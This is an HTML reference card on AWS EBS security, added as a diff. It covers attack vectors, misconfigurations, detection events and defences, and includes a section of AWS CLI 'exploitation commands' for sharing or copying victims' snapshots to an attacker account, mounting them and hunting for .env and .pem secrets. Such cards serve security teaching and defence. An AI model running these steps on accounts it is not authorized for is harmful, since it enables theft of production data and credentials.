@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS EBS Security | AWS Security Cards</title>
+<meta name="description" content="Elastic Block Store (EBS) provides persistent block storage for EC2 instances. Snapshots can contain sensitive data and are often misconfigured with public sharing permissions.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #22c55e15, #0a0e1a, #10b98115);
+    border: 1px solid #22c55e4d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #22c55e0d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #22c55e33;
+    color: #22c55e;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #22c55e4d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/ebs-card.webp" alt="AWS EBS Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/ebs.svg" alt="AWS EBS Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS EBS Security</span>
+        <span class="header-badge">STORAGE</span>
+      </div>
+      <p class="header-desc">Elastic Block Store (EBS) provides persistent block storage for EC2 instances. Snapshots can contain sensitive data and are often misconfigured with public sharing permissions.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">AZ</div>
+          <div class="stat-label">Scope</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">gp3/io2</div>
+          <div class="stat-label">Volume Types</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">KMS</div>
+          <div class="stat-label">Encryption</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#22c55e;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #22c55e;">Volume Types</h4>
+          <p>EBS offers multiple volume types: gp3/gp2 (general purpose SSD), io2/io1 (provisioned IOPS SSD), st1 (throughput HDD), and sc1 (cold HDD). Each attached to a single EC2 instance in the same AZ.</p>
+          <div class="attack-note"><span style="color:#22c55e;">Attack note:</span> Volumes contain raw disk data - databases, credentials, application secrets</div>
+        </div>
+        <div>
+          <h4 style="color: #22c55e;">Snapshots</h4>
+          <p>Point-in-time backups stored in S3. Can be shared across accounts or made public. Snapshots are incremental but each can restore a complete volume.</p>
+          <div class="attack-note"><span style="color:#22c55e;">Attack note:</span> Public snapshots are a goldmine - often contain secrets, SSH keys, database dumps</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 80%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">8.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">EBS snapshots frequently contain sensitive data and are commonly misconfigured with public access. Unencrypted volumes expose data at rest. Snapshot sharing enables cross-account data exfiltration.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Snapshot Exposure</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Public snapshots with sensitive data</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Cross-account snapshot sharing</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Copy public snapshots to attacker account</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Create volume from stolen snapshot</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Mount and extract all data</li></ul><h4 style="color: #f87171;">Volume Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Unencrypted volumes at rest</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abandoned volumes with secrets</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Snapshot ransomware (encrypt + delete)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Data exfiltration via snapshot copy</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify volume to inject malware</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Snapshot Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Snapshots shared publicly (Group: all)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Shared to unknown/untrusted accounts</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No encryption on snapshots</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Orphaned snapshots not cleaned up</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No lifecycle policies for retention</li></ul><h4 style="color: #fb923c;">Volume Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Default encryption disabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Using AWS managed keys vs CMK</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> DeleteOnTermination: false (orphaned)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No data classification tagging</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing backup/snapshot schedules</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Volumes</div>
+          <pre><code>aws ec2 describe-volumes</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Your Snapshots</div>
+          <pre><code>aws ec2 describe-snapshots --owner-ids self</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Find Public Snapshots</div>
+          <pre><code>aws ec2 describe-snapshots --restorable-by-user-ids all</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Check Snapshot Sharing</div>
+          <pre><code>aws ec2 describe-snapshot-attribute \\
+  --snapshot-id snap-xxx \\
+  --attribute createVolumePermission</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📤 Data Exfiltration</h3><h4 style="color: #c084fc;">Snapshot Theft Flow</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Find public/shared snapshot</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Copy snapshot to attacker account</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create volume from snapshot</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Attach volume to attacker EC2</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Mount and extract all data</li></ul><h4 style="color: #c084fc;">Data Targets</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Database files (MySQL, PostgreSQL)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> SSH keys and credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Application configuration files</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Environment files with secrets</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Logs with sensitive information</li></ul><div class="note"><strong>Gold Mine:</strong> Database snapshots often contain complete production data - user tables, credentials, PII.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Persistence Methods</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create snapshot of compromised volume</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Share snapshot to attacker account</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify volume with backdoor/rootkit</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Attach malicious volume to target EC2</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Store malware in hidden volume</li></ul><h4 style="color: #facc15;">Impact</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Survive instance termination</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Maintain access across reboots</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exfiltrate data over time</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Ransomware via snapshot encryption</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Supply chain via shared snapshots</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateSnapshot - snapshot created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ModifySnapshotAttribute - sharing changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CopySnapshot - snapshot copied</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateVolume - volume from snapshot</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteSnapshot - snapshot deleted</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Snapshot shared to unknown accounts</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Public snapshot attribute added</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Cross-region snapshot copies</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual volume attachments</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Bulk snapshot operations</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Copy Snapshot to Attacker Account</div>
+          <pre><code>aws ec2 copy-snapshot \\
+  --source-region us-east-1 \\
+  --source-snapshot-id snap-target \\
+  --description &quot;exfil&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Create Volume from Snapshot</div>
+          <pre><code>aws ec2 create-volume \\
+  --snapshot-id snap-stolen \\
+  --availability-zone us-east-1a</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Share Snapshot to Attacker</div>
+          <pre><code>aws ec2 modify-snapshot-attribute \\
+  --snapshot-id snap-xxx \\
+  --attribute createVolumePermission \\
+  --operation-type add \\
+  --user-ids 123456789012</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Attach Volume to EC2</div>
+          <pre><code>aws ec2 attach-volume \\
+  --volume-id vol-xxx \\
+  --instance-id i-attacker \\
+  --device /dev/sdf</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Mount and Extract (on EC2)</div>
+          <pre><code>sudo mkdir /mnt/stolen
+sudo mount /dev/xvdf1 /mnt/stolen
+find /mnt/stolen -name &quot;*.env&quot; -o -name &quot;*.pem&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Make Snapshot Public (DoS/Exposure)</div>
+          <pre><code>aws ec2 modify-snapshot-attribute \\
+  --snapshot-id snap-xxx \\
+  --attribute createVolumePermission \\
+  --operation-type add \\
+  --group-names all</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Public Snapshot</span>
+          </div>
+          <pre><code>Snapshot Attributes:
+CreateVolumePermission:
+  - Group: all    # PUBLIC SNAPSHOT!
+
+Volume: Unencrypted
+DeleteOnTermination: false
+
+// Anyone can copy this snapshot and access data</code></pre>
+          <p class="policy-desc">Anyone in AWS can copy this snapshot and access all data</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Private Encrypted</span>
+          </div>
+          <pre><code>Snapshot Attributes:
+CreateVolumePermission:
+  - UserId: 123456789012  # Specific account only
+
+Volume: Encrypted (KMS CMK)
+DeleteOnTermination: true
+Tags: {&quot;DataClassification&quot;: &quot;Confidential&quot;}</code></pre>
+          <p class="policy-desc">Only specific account can access, encrypted with customer key</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Enable Default Encryption</h4>
+              <p>Encrypt all new EBS volumes automatically with KMS.</p>
+              <pre><code>aws ec2 enable-ebs-encryption-by-default</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Block Public Snapshots</h4>
+              <p>Prevent snapshots from being shared publicly at the account level.</p>
+              <pre><code>aws ec2 enable-snapshot-block-public-access --state block-all-sharing</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Use Customer Managed KMS Keys</h4>
+              <p>Control key access and enable rotation for better security.</p>
+              <pre><code>aws ec2 create-volume --encrypted \\
+  --kms-key-id alias/my-ebs-key</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Enable CloudTrail Data Events</h4>
+              <p>Log snapshot and volume operations for auditing.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🗑️</span>
+            <div>
+              <h4>Implement Lifecycle Policies</h4>
+              <p>Auto-delete old snapshots to reduce exposure window.</p>
+              <pre><code>aws dlm create-lifecycle-policy \\
+  --policy-details '{&quot;PolicyType&quot;:&quot;EBS_SNAPSHOT_MANAGEMENT&quot;...}'</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>AWS Config Rules</h4>
+              <p>Alert on unencrypted volumes and public snapshots.</p>
+              <pre><code>ec2-ebs-encryption-by-default, ec2-snapshot-public-restorable-check</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS EBS Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
